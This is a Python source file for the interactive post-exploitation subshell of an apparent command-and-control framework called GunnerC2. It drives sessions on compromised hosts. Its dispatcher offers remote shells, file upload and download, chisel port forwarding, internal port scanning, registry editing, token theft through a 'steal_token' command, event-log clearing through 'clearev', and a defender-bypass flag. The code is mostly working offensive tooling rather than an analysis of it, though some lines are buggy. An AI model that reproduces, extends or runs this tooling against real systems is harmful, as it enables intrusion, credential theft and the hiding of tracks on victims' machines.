import shlex
import readline
import ntpath
import os, sys, subprocess
import re
from core.module_loader import load_module, discover_module_files, search_modules, MODULE_DIR as BASE_MODULE_DIR
from core.session_handlers.session_manager import resolve_sid
from core.utils import print_help, print_gunnershell_help, gunnershell_commands
from core import shell, portfwd, utils
from core.session_handlers import session_manager
from core.gunnershell.filesystem_master import *
from core.gunnershell import filesystem_master as filesystem
from core.gunnershell import network_master as net
from core.gunnershell import system_master as system
from colorama import init, Fore, Style
from core.prompt_manager import prompt_manager


brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
UNDERLINE_ON  = "\001\x1b[4m\002"
UNDERLINE_OFF = "\001\x1b[24m\002"

#MODULE_DIR = os.path.join(os.path.dirname(__file__), "modules")

MODULE_DIR = BASE_MODULE_DIR

class Gunnershell:
    """
    A Meterpreter-like subshell that can load and run Gunner modules against a session.
    Usage:
      gs = Gunnershell(session_id)
      gs.interact()
    """
    def __init__(self, sid):
        real = resolve_sid(sid)
        if not real or real not in session_manager.sessions:
            raise ValueError(brightred + f"Invalid session: {sid}")

        display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
        self.sid = real
        self.display = display
        self.session = session_manager.sessions[self.sid]
        prompt = f"{UNDERLINE_ON}{brightblue}GunnerShell{UNDERLINE_OFF} > "
        prompt_manager.set_prompt(prompt)
        self.prompt = prompt_manager.get_prompt()
        # discover available modules once
        self.available = discover_module_files(MODULE_DIR)
        self.os_type = self.session.metadata.get("os","").lower()
        self.cwd = pwd(self.sid, self.os_type) or ""
        """find_dir = pwd(self.sid, self.os_type)
        if "\\" in find_dir:
            self.cwd = find_dir.replace("\\", "\\\\")

        elif "\\" not in find_dir:
            self.cwd = find_dir

        else:
            print(brightred + f"[!] An unknown error has ocurred!")"""


    def make_abs(self, p):
        """
        Resolve p (which may be relative) against the current working
        directory (self.cwd), using the right path logic for windows/linux.
        """
        

        # if it's already absolute, just return it
        if ("windows" in self.os_type and ntpath.isabs(p)) or \
           ("linux"   in self.os_type and p.startswith("/")):
            return p

        base = self.cwd or ""
        joiner = ntpath if "windows" in self.os_type else self.os.path
        return joiner.normpath(joiner.join(base, p))


    def completer(self, text, state):
        # simple tab completion: modules and built-in commands
        try:
            builtins = list(gunnershell_commands.keys())
            options  = [c for c in self.available + builtins if c.startswith(text)]
            return options[state]

        except IndexError:
            pass

    def run_module(self, modname):
        """
        Load and run a module by name, using default options from session metadata.
        """
        module = load_module(modname)
        if not module:
            print(f"[!] Module not found: {modname}")
            return
        # auto-set common options if present
        meta = self.session.metadata
        for opt in ("sid", "session_id", "target", "host", "user"):  # example keys
            if opt in module.options and "sid" in module.options:
                module.set_option(opt, self.sid)
        missing = module.validate()
        if missing is not True:
            print(f"[!] Missing options: {', '.join(missing)}")
            return
        module.run()

    def interact(self):
        readline.set_completer(self.completer)
        readline.parse_and_bind("tab: complete")
        try:
            while True:
                user = input(self.prompt).strip()
                if not user:
                    continue

                # exit subshell
                if user in ("exit", "quit", "back"):
                    PROMPT = brightblue + "GunnerC2 > " + brightblue
                    prompt_manager.set_prompt(PROMPT)
                    self.prompt = prompt_manager.get_prompt()
                    break

                # help
                elif user.startswith("help"):
                    parts = user.split()

                    # help
                    if len(parts) == 1:
                        print_gunnershell_help()

                    # help <command>
                    elif len(parts) == 2:
                        print_gunnershell_help(parts[1])

                    # help <command> <subcommand>
                    elif len(parts) == 3:
                        print_gunnershell_help(f"{parts[1]} {parts[2]}")

                    else:
                        print(brightyellow + "Usage: help or help <command> [subcommand]")
                    continue

                # list modules
                elif user == "list":
                    print(brightgreen + "Available modules:")
                    for m in self.available:
                        print(brightgreen + f"  {m}")
                    continue

                elif user == "sessions":
                    utils.list_sessions()

                elif user.startswith("alias"):
                    parts = shlex.split(user)
                    if len(parts) != 3:
                        print(brightyellow + "Usage: alias <OLD_SID_or_ALIAS> <NEW_ALIAS>")
                        continue

                    old, new = parts[1], parts[2]
                    real = session_manager.resolve_sid(old)
                    if not real:
                        print(brightred + f"No such session or alias: {old}")
                        continue

                    session_manager.set_alias(new, real)
                    print(brightgreen + f"Alias set: {new!r} → {real}")

                    old_display = old
                    for entry in portforwards.values():
                        if entry["sid"] == old_display:
                            entry["sid"] = new

                    continue

                elif user.startswith("switch"):
                    parts = shlex.split(user)
                    if len(parts) != 2:
                        print(brightyellow + "Usage: switch <session_id_or_alias>")
                        continue

                    raw = parts[1]
                    new_sid = resolve_sid(raw)
                    if not new_sid or new_sid not in session_manager.sessions:
                        print(brightred + f"No such session or alias: {raw}")
                        continue

                    if new_sid == self.sid:
                        print(brightyellow + f"Already in GunnerShell for session {self.display}")
                        continue

                    display = next((a for a, rsid in session_manager.alias_map.items() if rsid == new_sid), new_sid)
                    print(brightgreen + f"[*] Switching out of this subshell and into session {display}...")
                    # return the new SID so the caller can re-spawn at top level
                    return new_sid

                elif user.startswith("shelldefence"):
                    parts = user.split()
                    try:
                        if len(parts) != 2 or parts[1] not in ("on", "off"):
                            print(brightyellow + "Usage: shelldefence <on|off>")

                        if parts[1] == "on":
                            defender.is_active = True

                        elif parts[1] == "off":
                            defender.is_active = False

                    except IndexError:
                        pass

                    except Exception as e:
                        print(brightred + f"[!] An unknown error has ocurred: {e}")

                # upload: upload <local> <remote>
                elif user.startswith("upload"):
                    parts = shlex.split(user)
                    if len(parts) != 3:
                        print(brightyellow + "Usage: upload <local_path> <remote_path>")

                    else:
                        local, remote = parts[1], parts[2]
                        if session_manager.sessions[self.sid].transport in ("http", "https"):
                            shell.upload_file_http(self.sid, local, remote)

                        else:
                            shell.upload_file_tcp(self.sid, local, remote)
                    continue

                # download: download <remote> <local>
                elif user.startswith("download"):
                    parts = shlex.split(user)

                    if len(parts) != 3:
                        print(brightyellow + "Usage: download <remote_path> <local_path>")

                    else:
                        remote, local = parts[1], parts[2]
                        if session_manager.sessions[self.sid].transport in ("http", "https"):
                            shell.download_file_http(self.sid, remote, local)

                        else:
                            shell.download_file_tcp(self.sid, remote, local)
                    continue

                # shell: drop into full interactive shell
                elif user.startswith("shell"):
                    if session_manager.sessions[self.sid].transport in ("http","https"):
                        shell.interactive_http_shell(self.sid)
                    else:
                        shell.interactive_tcp_shell(self.sid)
                    continue

                # modhelp: show a module’s options
                elif user.startswith("modhelp"):
                    parts = shlex.split(user)
                    if len(parts) != 2:
                        print(brightyellow + "Usage: modhelp <module_name>")
                    else:
                        modname = parts[1]
                        module = load_module(modname)
                        if module:
                            print(brightyellow + f"Module: {module.name}\n")
                            print(brightgreen + f"{module.description}\n")
                            module.show_options()
                    continue

                elif user.startswith("search"):
                    parts = shlex.split(user)
                    if len(parts) != 2:
                        print(brightyellow + "Usage: search <keyword>   or   search all")

                    else:
                        term = parts[1]
                        if term.lower() == "all":
                            results = discover_module_files(MODULE_DIR)
                        else:
                            results = search_modules(term)

                        if not results:
                            print(brightred + f"No modules found matching '{term}'.")
                        else:
                            self.available = results
                            print(brightgreen + f"Found {len(results)} modules:")
                            for idx, m in enumerate(results, 1):
                                print(brightgreen + f"  [{idx}] {m}")
                    continue

                # run: execute a module with inline key=val args
                elif user.startswith("run"):
                    parts = shlex.split(user)
                    if len(parts) < 2:
                        print(brightyellow + "Usage: run <module_name> [KEY=VALUE ...]")
                    else:
                        modname = parts[1]
                        module = load_module(modname)
                        if not module:
                            continue
                        # parse key=val pairs
                        for kv in parts[2:]:
                            if "=" in kv:
                                key, val = kv.split("=",1)
                                try:
                                    module.set_option(key, val)
                                except Exception:
                                    print(brightred + f"Unknown option '{key}'")
                        missing = module.validate()
                        if missing is True:
                            module.run()
                        else:
                            print(brightred + "[!] Missing required options: " + ", ".join(missing))
                    continue

                elif user.startswith("portfwd"):
                    parts = shlex.split(user)
                    # must have at least: portfwd <subcommand>
                    if len(parts) < 2 or parts[1] not in ("add","list","delete"):
                        print(brightyellow + "Usage: portfwd <add|list|delete> [options]")
                        continue

                    sub = parts[1]

                    # portfwd list
                    if sub == "list":
                        from core.utils import list_forwards
                        fwd = list_forwards()
                        if not fwd:
                            print(brightyellow + "No active port-forwards.")
                        else:
                            for rid, info in fwd.items():
                                print(brightgreen + f"{rid}: {info['local_host']}:{info['local']} → {info['sid']} → {info['remote']}")
                        continue

                    # portfwd delete -i <rule_id>
                    if sub == "delete":
                        if "-i" not in parts:
                            print(brightyellow + "Usage: portfwd delete -i <rule_id>")
                        else:
                            rid = parts[parts.index("-i")+1]
                            from core.utils import unregister_forward
                            unregister_forward(rid)
                            print(brightyellow + f"Removed forward {rid}")
                        continue

                    # portfwd add -lh <local_host> -lp <local_port> -rh <remote_host> -rp <remote_port> -cp <chisel_port>
                    if sub == "add":
                        try:
                            opts = dict(zip(parts[2::2], parts[3::2]))
                            lh = opts["-lh"]
                            lp = int(opts["-lp"])
                            rh = opts["-rh"]
                            rp = int(opts["-rp"])
                            cp = int(opts["-cp"])
                        except Exception:
                            print(brightyellow + "Usage: portfwd add -lh <local_host> -lp <local_port> -rh <remote_host> -rp <remote_port> -cp <chisel_port>")
                            continue

                        # start the listener thread
                        from core import portfwd as _pfwd
                        import threading
                        rid = str(len(utils.portforwards) + 1)
                        sid = session_manager.resolve_sid(self.sid)
                        t = threading.Thread(
                            target=_pfwd.portfwd_listener,
                            args=(rid, sid, lh, lp, rh, rp, cp),
                            daemon=True
                        )
                        t.start()

                        # register it so `list` can see it
                        utils.register_forward(rid, self.sid, lh, lp, rh, rp, t, _pfwd.last_listener_socket)
                        print(brightgreen + f"[+] Forward #{rid} {lh}:{lp} → {self.sid} → {rh}:{rp}")
                        continue

                #################################################################################################
                ##################################File System Commands###########################################
                #################################################################################################
                #################################################################################################

                elif user.startswith("ls") or user.startswith("dir"):
                    try:
                        parts = shlex.split(user)

                    except ValueError:
                        # fall back if they had an unescaped trailing backslash
                        parts = user.split(maxsplit=1)

                    except Exception as e:
                        print(brightred + f"[!] We hit an error while parsing your command: {e}")
                    
                    # 1) exactly "ls" → default to current dir
                    if len(parts) == 1:
                        target = self.cwd

                    # 2) "ls <path>"
                    elif len(parts) == 2:
                        raw = parts[1]
                        # on Linux: absolute if starts with "/"
                        if "linux" in self.os_type and raw.startswith("/"):
                            target = raw
                        # on Windows: absolute if drive letter like "C:\"
                        elif "windows" in self.os_type and ntpath.isabs(raw):
                            target = raw
                        else:
                            if "windows" in self.os_type:
                                # use ntpath so “..” works against a C:\ drive path
                                combined = ntpath.join(self.cwd, raw)
                                target   = ntpath.normpath(combined)
                            else:
                                combined = os.path.join(self.cwd, raw)
                                target   = os.path.normpath(combined)

                    # 3) too many args
                    else:
                        print(brightyellow + "Usage: ls [<path>]")
                        continue

                    # on Windows, detect a root drive (e.g. "C:" or "C:\")
                    is_root_drive = False
                    if "windows" in self.os_type:
                        if re.match(r'^[A-Za-z]:(\\)?$', target):
                            is_root_drive = True

                    if is_root_drive:
                        # strip trailing slash so our closing quote isn't escaped
                        safe = target.rstrip("\\/")
                        cmd  = f"ls -force -path '{safe}'"
                        # bypass the defender for root listings
                        out = shell.run_command_tcp(self.sid,cmd,timeout=0.5,defender_bypass=True)
                    else:
                        out = ls(self.sid, self.os_type, target)

                    if out:
                        print(brightgreen + f"\n{out}")

                    else:
                        print(brightyellow + "[*] No output")
                    continue

                elif user == "pwd":
                    cwd = pwd(self.sid, self.os_type)
                    if cwd:
                        print(cwd)

                    else:
                        print(brightyellow + "[*] No output or error")
                    continue

                elif user.startswith("cd"):
                    # split into exactly two tokens, but do NOT treat '\' as an escape
                    parts = shlex.split(user, comments=False, posix=False)
                    if len(parts) != 2:
                        print(brightyellow + "Usage: cd <path>")
                        continue

                    target = parts[1]
                    new_cwd = cd(self.sid, self.os_type, target)

                    if new_cwd:
                        self.cwd = new_cwd
                        print(brightgreen + new_cwd)

                    else:
                        print(brightred + f"[!] Failed to cd to '{target}'")
                    continue

                elif user.startswith("cat"):
                    parts = None
                    try:
                        parts = shlex.split(user, 1)
                        raw = parts[1]

                    except ValueError:
                        # fallback if they had an unescaped trailing backslash
                        parts = user.split(maxsplit=1)

                    except Exception as e:
                        print(brightred + f"[!] We hit an error while parsing your command: {e}")

                    # require exactly one argument
                    if len(parts) != 2:
                        print(brightyellow + "Usage: cat <filepath>")
                        continue

                    # decide absolute vs relative
                    if "linux" in self.os_type and raw.startswith("/"):
                        target = raw

                    elif "windows" in self.os_type and ntpath.isabs(raw):
                        target = raw

                    else:
                        # relative → resolve against self.cwd
                        if "windows" in self.os_type:
                            joined = ntpath.join(self.cwd, raw)
                            target = ntpath.normpath(joined)

                        else:
                            joined = os.path.join(self.cwd, raw)
                            target = os.path.normpath(joined)

                    # finally invoke remote cat
                    out = cat(self.sid, self.os_type, target)
                    if out:
                        print(brightgreen + out)

                    else:
                        print(brightyellow + "[*] No output or file not found")
                    continue

                elif user.startswith("cp"):
                    try:
                        parts = shlex.split(user, 2)
                        raw_src, raw_dst = parts[1], parts[2]

                    except Exception as e:
                        print(brightred + f"[!] We hit an error while parsing your command: {e}")

                    if len(parts) != 3:
                        print(brightyellow + "Usage: cp <source> <destination>")
                        continue

                    # both paths may be relative → join to cwd

                    if raw_src and raw_dst:
                        src = self.make_abs(raw_src)
                        dst = self.make_abs(raw_dst)

                    out = filesystem.cp(self.sid, self.os_type, src, dst)

                    if out:
                        print(brightgreen + out)

                    else:
                        print(brightyellow + "[*] Copy completed!")
                    continue

                elif user.startswith("del ") or user.startswith("rm "):
                    try:
                        parts = shlex.split(user, 1)
                        raw = parts[1]
                        verb = parts[0]

                    except Exception as e:
                        print(brightred + f"[!] We hit an error while parsing your command: {e}")

                    if len(parts) != 2:
                        print(brightyellow + "Usage: del <path>  or  rm <path>")
                        continue

                    # if not absolute, join to cwd
                    
                    if raw:
                        raw = self.make_abs(raw)

                    out = delete(self.sid, self.os_type, raw)
                    if out:
                        print(brightgreen + out)

                    else:
                        print(brightyellow + f"[*] {verb} completed")
                    continue

                elif user.startswith("mkdir") or user.startswith("md"):
                    try:
                        parts = shlex.split(user, 1)
                        raw = parts[1]

                    except Exception as e:
                        print(brightred + f"[!] We hit an error while parsing your command: {e}")
                    if len(parts) != 2:
                        print(brightyellow + "Usage: mkdir <path>  or  md <path>")
                        continue

                    # resolve relative to cwd

                    if raw:
                        raw_path = self.make_abs(raw)

                    else:
                        print(brightred + f"[!] An unknown error ocurred!")

                    out = mkdir(self.sid, self.os_type, raw_path)
                    if out:
                        print(brightgreen + out)

                    else:
                        print(brightgreen + f"Created directory: {raw}")
                    continue

                # touch
                elif user.startswith("touch"):
                    try:
                        parts = shlex.split(user, 1)
                        raw = parts[1]

                    except Exception as e:
                        print(brightred + f"[!] We hit an error while parsing your command: {e}")

                    if len(parts) != 2:
                        print(brightyellow + "Usage: touch <path>")
                        continue

                    raw = self.make_abs(raw)

                    out = touch(self.sid, self.os_type, raw)

                    if out:
                        print(brightgreen + out)

                    else:
                        print(brightgreen + f"Created file: {raw} on compromised host {self.display}")
                    continue

                # — checksum —
                elif user.startswith("checksum"):
                    try:
                        parts = shlex.split(user, 1)
                        raw = parts[1]

                    except Exception as e:
                        print(brightred + f"[!] We hit an error while parsing your command: {e}")
                    if len(parts) != 2:
                        print(brightyellow + "Usage: checksum <path>")
                        continue

                    # make raw absolute against cwd if it isn’t already
                    raw = self.make_abs(raw)

                    out = filesystem.checksum(self.sid, self.os_type, raw)
                    if out:
                        print(brightgreen + out)
                    continue


                elif user.startswith("mv"):
                    try:
                        parts = shlex.split(user)

                    except Exception as e:
                        print(brightred + f"[!] We hit an error while parsing your command: {e}")

                    if len(parts) != 3:
                        print(brightyellow + "Usage: mv <src> <dst>")
                        continue

                    raw_src, raw_dst = parts[1], parts[2]
                    norm = ntpath if "windows" in self.os_type else os.path

                    # resolve src
                    """if (("windows" in self.os_type and not ntpath.isabs(raw_src)) or
                    ("linux"   in self.os_type and not raw_src.startswith("/"))):
                        raw_src = norm.normpath(norm.join(self.cwd, raw_src))
                    # resolve dst
                    if (("windows" in self.os_type and not ntpath.isabs(raw_dst)) or
                    ("linux"   in self.os_type and not raw_dst.startswith("/"))):
                        raw_dst = norm.normpath(norm.join(self.cwd, raw_dst))"""

                    raw_src = self.make_abs(raw_src)
                    raw_dst = self.make_abs(raw_dst)

                    out = filesystem.mv(self.sid, self.os_type, raw_src, raw_dst)
                    if out:
                        print(brightgreen + out)
                        continue


                # — rmdir (remove directory) —
                elif user.startswith("rmdir"):
                    try:
                        parts = shlex.split(user, 1)

                    except Exception as e:
                        print(brightred + f"[!] We hit an error while parsing your command: {e}")

                    if len(parts) != 2:
                        print(brightyellow + "Usage: rmdir <path>")
                        continue

                    raw = parts[1]
                
                    raw = self.make_abs(raw)

                    out = filesystem.rmdir(self.sid, self.os_type, raw)
                    if out:
                        print(brightgreen + out)
                        continue

                elif user == "drives":
                    out = filesystem.drives(self.sid, self.os_type)
                    if out:
                        print(brightgreen + f"\n{out}")
                        
                    else:
                        print(brightyellow + "[*] No output or error")
                    continue

                elif user.startswith("edit"):
                    try:
                        parts = shlex.split(user, 1)

                    except Exception as e:
                        print(brightred + f"[!] We hit an error while parsing your command: {e}")

                    if len(parts) != 2:
                        print(brightyellow + "Usage: edit <path>")
                        continue

                    raw = parts[1]

                    # resolve relative → absolute against cwd
                    raw = self.make_abs(raw)

                    result = filesystem.edit(self.sid, self.os_type, raw)
                    print(brightgreen + result)
                    continue


                #################################################################################################
                ##################################Networking Commands############################################
                #################################################################################################
                #################################################################################################

                elif user == "netstat":
                    out = net.netstat(self.sid, self.os_type)
                    print(brightgreen + f"\n{out}")
                    continue

                elif user.startswith("ipconfig") or user.startswith("ifconfig"):
                    try:
                        parts = shlex.split(user)

                    except Exception as e:
                        print(brightred + f"[!] We hit an error while parsing your command: {e}")

                    if len(parts) != 1:
                        print(brightyellow + "Usage: ipconfig")
                        continue

                    out = net.ipconfig(self.sid, self.os_type)

                    if out:
                        print(brightgreen + out)
                    else:
                        print(brightyellow + "[*] No output")
                    continue

                elif user == "arp":
                    out = net.arp(self.sid, self.os_type)
                    print(brightgreen + f"\n{out}")
                    continue

                elif user.startswith("resolve ") or user.startswith("nslookup "):
                    try:
                        parts = shlex.split(user, 1)
                        host = parts[1]

                    except Exception as e:
                        print(brightred + f"[!] We hit an error while parsing your command: {e}")

                    out = net.resolve(self.sid, self.os_type, host)
                    print(brightgreen + f"\n{out}")
                    continue

                elif user == "route":
                    out = net.route(self.sid, self.os_type)
                    print(brightgreen + f"\n{out}")
                    continue

                elif user.startswith("getproxy"):
                    try:
                        parts = shlex.split(user)

                    except Exception as e:
                        print(brightred + f"[!] We hit an error while parsing your command: {e}")

                    if len(parts) != 1:
                        print(brightyellow + "Usage: getproxy")
                        continue

                    out = net.getproxy(self.sid, self.os_type)

                    if out:
                        print(brightgreen + out)
                    else:
                        print(brightyellow + "[*] No proxy configuration found")
                    continue

                elif user.startswith("portscan"):
                    parts = shlex.split(user)
                    skip_ping = "-Pn" in parts
                    # extract -p if present
                    ports_arg = None
                    if "-p-" in parts:
                        ports_arg = "-"
                        parts.remove("-p-")

                    elif "-p" in parts:
                        pi = parts.index("-p")
                        try:
                            ports_arg = parts[pi+1]
                            parts.pop(pi+1)
                            parts.pop(pi)

                        except IndexError:
                            print(brightyellow + "Usage: portscan [-Pn] [-p <ports> | -p-] <IP_or_subnet>")
                            continue

                    # now what's left should be just the subnet/host
                    args = [p for p in parts[1:] if p != "-Pn"]
                    if len(args) != 1:
                        print(brightyellow + "Usage: portscan [-Pn] [-p <ports>] <IP_or_subnet>")
                        continue

                    target = args[0]
                    out = net.portscan(self.sid, self.os_type, target,skip_ping=skip_ping, port_spec=ports_arg)
                    if out:
                        print(brightgreen + f"\n{out}")
                    else:
                        print(brightyellow + "[*] No output or scan failed")
                    continue

                #################################################################################################
                ##################################System Commands################################################
                #################################################################################################
                #################################################################################################

                elif user == "sysinfo":
                    out = system.sysinfo(self.sid, self.os_type)
                    if out:
                        print(brightgreen + out)
                    else:
                        print(brightyellow + "[*] No output or error")
                    continue

                elif user == "ps":
                    out = system.ps(self.sid, self.os_type)
                    if out:
                        print(brightgreen + out)
                    else:
                        print(brightyellow + "[*] No output or error")
                    continue

                elif user == "getuid":
                    out = system.getuid(self.sid, self.os_type)
                    if out:
                        print(brightgreen + out)
                    else:
                        print(brightyellow + "[*] No output or error")
                    continue

                elif user == "getprivs":
                    out = system.getprivs(self.sid, self.os_type)
                    if out:
                        print(brightgreen + out)
                    else:
                        print(brightyellow + "[*] No output or error")
                    continue

                elif user.strip() == "getpid":
                    out = system.getpid(self.sid, self.os_type)
                    if out:
                        print(brightgreen + out)
                    continue

                # getenv: retrieve one or more env vars
                elif user.startswith("getenv"):
                    parts = shlex.split(user)

                    if len(parts) == 1:
                        out = system.getenv(self.sid, self.os_type)

                    else:
                        vars_to_fetch = parts[1:]
                        out = system.getenv(self.sid, self.os_type, *vars_to_fetch)

                    if out:
                        print(brightgreen + out)
                    continue

                elif user.startswith("exec"):
                    parts = shlex.split(user)
                    if len(parts) < 2:
                        print(brightyellow + "Usage: exec <command> [args...]")
                        continue

                    cmdparts = parts[1:]

                    out = system.exec(self.sid, self.os_type, *cmdparts)
                    if out:
                        print(brightgreen + out)
                    continue

                # kill: terminate a PID
                elif user.startswith("kill"):
                    parts = shlex.split(user)
                    if len(parts) != 2:
                        print(brightyellow + "Usage: kill <pid>")
                        continue

                    pid = parts[1]

                    out = system.kill(self.sid, self.os_type, pid)
                    if out:
                        print(out)
                    continue

                # getsid: show current Windows SID
                elif user.startswith("getsid"):
                    out = system.getsid(self.sid, self.os_type)

                    if out:
                        print(brightgreen + out)
                    continue

                elif user.startswith("clearev"):
                    parts = shlex.split(user)
                    if len(parts) > 1:
                        if (p in ("-f", "--force") for p in parts[1:]):
                            force = True

                    elif len(parts) > 1:
                        if (p not in ("-f", "--force") for p in parts[1:]):
                            print(brightyellow + f"Usage: clearev  OPTIONAL: -f or --force")

                    else:
                        force = False

                    print(brightyellow + "[*] Clearing event logs (this may take a while)...")
                    out = system.clearev(self.sid, self.os_type, force=force)

                    if out:
                        print(brightgreen + out)
                    continue

                # show remote local time
                elif user.startswith("localtime"):
                    out = system.localtime(self.sid, self.os_type)
                    if out:
                        print(brightgreen + out)
                    continue

                # reboot remote host
                elif user.startswith("reboot"):
                    out = system.reboot(self.sid, self.os_type)
                    if out:
                        print(brightgreen + out)
                    continue

                # pgrep: pattern
                elif user.startswith("pgrep"):
                    parts = shlex.split(user, 1)
                    if len(parts) != 2:
                        print(brightyellow + "Usage: pgrep <pattern>")
                        continue

                    pattern = parts[1]

                    out = system.pgrep(self.sid, self.os_type, pattern)
                    if out:
                        print(brightgreen + out)
                    continue

                # pkill: pattern
                elif user.startswith("pkill"):
                    parts = shlex.split(user, 1)
                    if len(parts) != 2:
                        print(brightyellow + "Usage: pkill <pattern>")
                        continue

                    pid = parts[1]

                    out = system.pkill(self.sid, self.os_type, pid)
                    if out:
                        print(brightgreen + out)
                    continue

                elif user.startswith("suspend"):
                    parts = shlex.split(user)
                    if len(parts) != 2:
                        print(brightyellow + "Usage: suspend <pid>")
                        continue

                    pid = parts[1]
                    out = system.suspend(self.sid, self.os_type, pid)
                    print(brightgreen + out if out else brightred + f"[!] Failed to suspend {pid}")
                    continue

                elif user.startswith("resume"):
                    parts = shlex.split(user)
                    if len(parts) != 2:
                        print(brightyellow + "Usage: resume <pid>")
                        continue

                    pid = parts[1]
                    out = system.resume(self.sid, self.os_type, pid)
                    print(brightgreen + out if out else brightred + f"[!] Failed to resume {pid}")
                    continue

                elif user.startswith("shutdown"):
                    parts = shlex.split(user)
                    # shutdown [ -r | -h ]
                    try:
                        args = parts[1:]  # may be empty or ['-r'] or ['-h']

                    except Exception:
                        args = None
                        pass

                    out = system.shutdown(self.sid, self.os_type, *args)
                    print(brightgreen + out if out else brightred + "[!] Shutdown failed")
                    continue

                elif user.startswith("reg "):
                    parts = shlex.split(user, 4)
                    if len(parts) < 3:
                        print(brightyellow + "Usage: reg <query|get|set|delete> <hive>\\<path> [<name> <data>] [/s|/f]")
                        continue

                    action = parts[1].lower()
                    hive_path = parts[2].rstrip("\\")   # strip any trailing “\”

                    # if there’s a backslash in hive_path it splits into hive/key_path,
                    # otherwise key_path becomes an empty string
                    if "\\" in hive_path:
                        hive, key_path = hive_path.split("\\", 1)
                    else:
                        hive, key_path = hive_path, ""

                    name_or_flag = parts[3] if len(parts) >= 4 else None
                    data        = parts[4] if len(parts) == 5 else None

                    out = system.reg(self.sid, self.os_type, action, hive, key_path, name_or_flag, data)
                    if out:
                        print(brightgreen + out)
                    continue

                elif user.startswith("services"):
                    parts = shlex.split(user)
                    if len(parts) < 2 or parts[1] not in ("list","start","stop","restart"):
                        print(brightyellow + "Usage: services <list|start|stop|restart> [<service_name>]")
                        continue

                    action = parts[1]
                    svc = parts[2] if len(parts) == 3 else None
                    out = system.services(self.sid, self.os_type, action, svc)
                    if out:
                        print(brightgreen + out)
                    continue

                # netusers: list local user accounts
                elif user.strip() == "netusers":
                    out = system.netusers(self.sid, self.os_type)
                    if out:
                        print(brightgreen + out)
                    continue

                # netgroups: list local group accounts
                elif user.strip() == "netgroups":
                    out = system.netgroups(self.sid, self.os_type)
                    if out:
                        print(brightgreen + out)
                    continue

                elif user.startswith("steal_token"):
                    parts = shlex.split(user)
                    # show full help if no args or just "steal_token"
                    if len(parts) < 2:
                        print_gunnershell_help("steal_token")
                        continue

                    # invoke the backend
                    out = system.steal_token(self.sid, self.os_type, *parts[1:])

                    if out:
                        # if the handler returned usage or an argparse error, re-show detailed help
                        if out.lower().startswith("usage:"):
                            print_gunnershell_help("steal_token")
                        else:
                            # any other error or message
                            print(brightyellow + out)
                    else:
                        # success: server’s up and payload is launching
                        print(brightgreen + "[+] steal_token dispatched.")

                    continue

                else:
                    print(brightred + f"[!] Unknown command!")

        except (EOFError, KeyboardInterrupt):
            print()

        finally:
            readline.set_completer(None)
